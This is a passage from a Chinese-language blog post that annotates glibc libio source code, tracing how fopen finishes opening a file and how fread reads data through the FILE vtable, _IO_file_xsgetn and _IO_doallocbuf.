<span class="type">int</span> read_write, <span class="type">int</span> is32not64)</span><br><span class="line"><span class="number">182</span> &#123;</span><br><span class="line"><span class="number">183</span>   <span class="type">int</span> fdesc;</span><br><span class="line"><span class="number">184</span>   <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line"><span class="number">185</span>     fdesc = __open_nocancel (filename,</span><br><span class="line"><span class="number">186</span>                  posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="number">187</span>   <span class="keyword">else</span></span><br><span class="line"><span class="number">188</span>     fdesc = __open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="number">189</span>   <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">190</span>     <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">191</span>   fp-&gt;_fileno = fdesc;</span><br><span class="line"><span class="number">192</span>   _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line"><span class="number">193</span>   <span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">194      update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line"><span class="number">195</span>   <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line"><span class="number">196</span>       == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line"><span class="number">197</span>     &#123;</span><br><span class="line"><span class="number">198</span>       <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line"><span class="number">199</span>       <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line"><span class="number">200</span>     &#123;</span><br><span class="line"><span class="number">201</span>       __close_nocancel (fdesc);</span><br><span class="line"><span class="number">202</span>       <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">203</span>     &#125;</span><br><span class="line"><span class="number">204</span>     &#125;</span><br><span class="line"><span class="number">205</span>   _IO_link_in ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"><span class="number">206</span>   <span class="keyword">return</span> fp;</span><br><span class="line"><span class="number">207</span> &#125;</span><br></pre></td></tr></table></figure><p>函数的主要功能就是执行<strong>系统调用<code>open</code>打开文件</strong>，<strong>并将文件描述符赋值给FILE结构体的<code>_fileno</code>字段</strong></p><p>最后再次调用<code>_IO_link_in</code>函数，确保该结构体被链接进入<code>_IO_list_all</code>链表。</p><h3 id="5-查看打开的文件是否需要特殊转换"><a href="#5-查看打开的文件是否需要特殊转换" class="headerlink" title="5.查看打开的文件是否需要特殊转换"></a>5.查看打开的文件是否需要特殊转换</h3><p>这里主要是针对宽字符进行相关的处理和模式设置，详细的内容就不赘述了，具体细节与正常的打开流程基本一致，最后设置宽字符的字符处理虚函数表_wide_vtable。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* Test whether the mode string specifies the conversion.  */</span></span><br><span class="line">     cs = <span class="built_in">strstr</span> (last_recognized + <span class="number">1</span>, <span class="string">&quot;,ccs=&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (cs != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Yep.  Load the appropriate conversions and set the orientation</span></span><br><span class="line"><span class="comment">     to wide.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">gconv_fcts</span> <span class="title">fcts</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span>;</span></span><br><span class="line">  <span class="type">char</span> *endp = __strchrnul (cs + <span class="number">5</span>, <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">  <span class="type">char</span> *ccs = <span class="built_in">malloc</span> (endp - (cs + <span class="number">5</span>) + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ccs == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> malloc_err = errno;  <span class="comment">/* Whatever malloc failed with.  */</span></span><br><span class="line">      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">      __set_errno (malloc_err);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  *((<span class="type">char</span> *) __mempcpy (ccs, cs + <span class="number">5</span>, endp - (cs + <span class="number">5</span>))) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  strip (ccs, ccs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="number">2</span>] == <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">   ? upstr (ccs, cs + <span class="number">5</span>) : ccs) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Something went wrong, we cannot load the conversion modules.</span></span><br><span class="line"><span class="comment"> This means we cannot proceed since the user explicitly asked</span></span><br><span class="line"><span class="comment"> for these.  */</span></span><br><span class="line">      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">      <span class="built_in">free</span> (ccs);</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span> (ccs);</span><br><span class="line"></span><br><span class="line">  assert (fcts.towc_nsteps == <span class="number">1</span>);</span><br><span class="line">  assert (fcts.tomb_nsteps == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Clear the state.  We start all over again.  */</span></span><br><span class="line">  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line">  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line"></span><br><span class="line">  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_in.step = fcts.towc;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_in.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__flags = __GCONV_IS_LAST;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_out.step = fcts.tomb;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_out.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__flags = __GCONV_IS_LAST | __GCONV_TRANSLIT;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* From now on use the wide character callback functions.  */</span></span><br><span class="line">  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the mode now.  */</span></span><br><span class="line">  result-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="0x6-fopen-maybe-mmap-函数"><a href="#0x6-fopen-maybe-mmap-函数" class="headerlink" title="0x6__fopen_maybe_mmap 函数"></a>0x6__fopen_maybe_mmap 函数</h3><p>针对 flags2 为 mmap 且 flags 设定为”r”的模式，可以直接使用 mmap 内容的方式，因为不需要修改原文件内容，所以需要替换 fp 中字符操作的虚函数表，使用 maybe_mmap 类型的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">33</span> FILE *</span><br><span class="line"><span class="number">34</span> __fopen_maybe_mmap (FILE *fp)</span><br><span class="line"><span class="number">35</span> &#123;</span><br><span class="line"><span class="number">36</span> <span class="meta">#<span class="keyword">if</span> _G_HAVE_MMAP</span></span><br><span class="line"><span class="number">37</span>   <span class="keyword">if</span> ((fp-&gt;_flags2 &amp; _IO_FLAGS2_MMAP) &amp;&amp; (fp-&gt;_flags &amp; _IO_NO_WRITES))</span><br><span class="line"><span class="number">38</span>     &#123;</span><br><span class="line"><span class="number">39</span>       <span class="comment">/* Since this is read-only, we might be able to mmap the contents</span></span><br><span class="line"><span class="comment">40      directly.  We delay the decision until the first read attempt by</span></span><br><span class="line"><span class="comment">41      giving it a jump table containing functions that choose mmap or</span></span><br><span class="line"><span class="comment">42      vanilla file operations and reset the jump table accordingly.  */</span></span><br><span class="line"><span class="number">43</span> </span><br><span class="line"><span class="number">44</span>       <span class="keyword">if</span> (fp-&gt;_mode &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="number">45</span>     _IO_JUMPS_FILE_plus (fp) = &amp;_IO_file_jumps_maybe_mmap;</span><br><span class="line"><span class="number">46</span>       <span class="keyword">else</span></span><br><span class="line"><span class="number">47</span>     _IO_JUMPS_FILE_plus (fp) = &amp;_IO_wfile_jumps_maybe_mmap;</span><br><span class="line"><span class="number">48</span>       fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps_maybe_mmap;</span><br><span class="line"><span class="number">49</span>     &#125;</span><br><span class="line"><span class="number">50</span> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="number">51</span>   <span class="keyword">return</span> fp;</span><br><span class="line"><span class="number">52</span> &#125;</span><br></pre></td></tr></table></figure><hr><p>如果分配失败</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line"><span class="built_in">free</span> (new_f);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>取消链接并且free chunk返回NULL</p><h1 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h1><p>描述fread读取文件流的主要流程以及函数对IO FILE结构体以及结构体中的vtable的操作</p><p>这篇文章则是说在创建了文件FILE以后，fread如何实现从文件中读取数据的。</p><p>参考下流程图:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/t010fa5ddb8016fb9b2.png" alt=""></p><p>整体流程为<code>fread</code>调用<code>_IO_sgetn</code>，<code>_IO_sgetn</code>调用vtable中的<code>_IO_XSGETN</code>也就是<code>_IO_file_xsgetn</code>，<code>_IO_file_xsgetn</code>是<code>fread</code>实现的核心函数。它的流程简单总结为：</p><ol><li>判断<code>fp-&gt;_IO_buf_base</code>输入缓冲区是否为空，如果为空则调用的<code>_IO_doallocbuf</code>去初始化输入缓冲区。</li><li>在分配完输入缓冲区或输入缓冲区不为空的情况下，判断输入缓冲区是否存在数据。</li><li>如果输入缓冲区有数据则直接拷贝至用户缓冲区，如果没有或不够则调用<code>__underflow</code>函数执行系统调用读取数据到输入缓冲区，再拷贝到用户缓冲区。</li></ol><hr><p>fread实际上是<code>_IO_fread</code>函数，文件目录为<code>/libio/iofread.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> bytes_requested = size * count;</span><br><span class="line">  <span class="type">size_t</span> bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);<span class="comment">//here</span></span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心是_IO_sgetn,在libio/gneops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_sgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_XSGETN是一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP,DATA,N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">......       + offsetof(TYPE, MEMBER)))</span></span><br><span class="line">Expands to:</span><br><span class="line"></span><br><span class="line">((IO_validate_vtable ((*(__typeof__ (((<span class="keyword">struct</span> _IO_FILE_plus)&#123;&#125;).vtable) *)(((<span class="type">char</span> *) ((fp))) + __builtin_offsetof (<span class="keyword">struct</span> _IO_FILE_plus, vtable)))))-&gt;__xsgetn) (fp, data, n)</span><br></pre></td></tr></table></figure><p>实际上就是FILE结构体中vtable的<code>__xsgetn</code>函数，跟进去<code>/libio/fileops.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_file_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> want, have;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line">  <span class="type">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;<span class="comment">// 第一部分，如果fp-&gt;_IO_buf_base为空的话则调用`_IO_doallocbuf`</span></span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)<span class="comment">//!!!注意这个循环++++++</span></span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)<span class="comment">// 第二部分，输入缓冲区里已经有足够的字符，则直接把缓冲区里的字符给目标buff</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;<span class="comment">//---从这一部分也可以看出,输入多余程序指定的内容,多余部分会被留在缓冲区中供下一次使用---</span></span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)<span class="comment">// 第二部分，输入缓冲区里有部分字符，但是没有达到fread的size需求，先把已有的拷贝至目标buff</span></span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;<span class="comment">//那么_IO_read_ptr==_IO_read_end</span></span><br><span class="line">    &#125;</span><br><span class="line">          <span class="comment">//可能有人会有疑惑,读入后s没有变化,那么每次读入不都是读入到同一个地方,会覆盖之前的吗</span></span><br><span class="line">          <span class="comment">//见注1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">     the user buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">      &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<span class="comment">//want小于buf承载极限</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__underflow (fp) == EOF) <span class="comment">// 第三部分，输入缓冲区里不能满足需求，调用__underflow读入数据,当然这是在want&lt;buffer空间的情况下</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;<span class="comment">//返回ptr则continue</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//循环真正的内容一般执行到这里就结束了</span></span><br><span class="line">        <span class="comment">//再往下的内容是buf分配失败情况下,直接调用sysread的代码</span></span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line">  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">     waiting for input. */</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">  count = want;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">count -= want % block_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  s += count;</span><br><span class="line">  want -= count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;<span class="comment">//返回读入的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>IO_file_xsgetn</code>是处理<code>fread</code>读入数据的核心函数，分为三个部分：</p><ul><li>第一部分是<code>fp-&gt;_IO_buf_base</code>为空的情况，表明此时的FILE结构体中的指针未被初始化，输入缓冲区未建立，则调用<code>_IO_doallocbuf</code>去初始化指针，建立输入缓冲区。</li><li>第二部分是输入缓冲区里有输入，即<code>fp-&gt;_IO_read_ptr</code>小于<code>fp-&gt;_IO_read_end</code>，此时将缓冲区里的数据直接拷贝至目标buff。</li><li>第三部分是输入缓冲区里的数据为空或者是不能满足全部的需求，则调用<code>__underflow</code>调用系统调用读入数据。</li></ul><p>接下来对<code>_IO_file_xsgetn</code>这三部分进行跟进并分析。</p><p>注<strong>1:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __mempcpy mempcpy</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mempcpy(D, S, N) ((void *) ((char *) memcpy (D, S, N) + (N)))</span></span><br></pre></td></tr></table></figure><p><strong>因此<code>s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</code>语句会自动更新s的值</strong></p><h2 id="0x1-1"><a href="#0x1-1" class="headerlink" title="0x1"></a>0x1</h2><p><strong>初始化输入缓冲区</strong></p><p>在<code>fp-&gt;_IO_buf_base</code>为空时，也就是输入缓冲区未建立时，代码调用<code>_IO_doallocbuf</code>函数去建立输入缓冲区。跟进<code>_IO_doallocbuf</code>函数，看下它是如何初始化输入缓冲区，为输入缓冲区分配空间的，文件在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_doallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)<span class="comment">// 如何输入缓冲区不为空，直接返回</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)<span class="comment">//检查标志位</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)<span class="comment">//调用vtable函数</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数先检查<code>fp-&gt;_IO_buf_base</code>是否为空，如果不为空的话表明该输入缓冲区已被初始化，直接返回。如果为空，则检查<code>fp-&gt;_flags</code>看它是不是<code>_IO_UNBUFFERED</code>或者<code>fp-&gt;_mode</code>大于0，如果满足条件调用FILE的vtable中的<code>_IO_file_doallocate</code>，跟进去该函数，在<code>/libio/filedoalloc.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 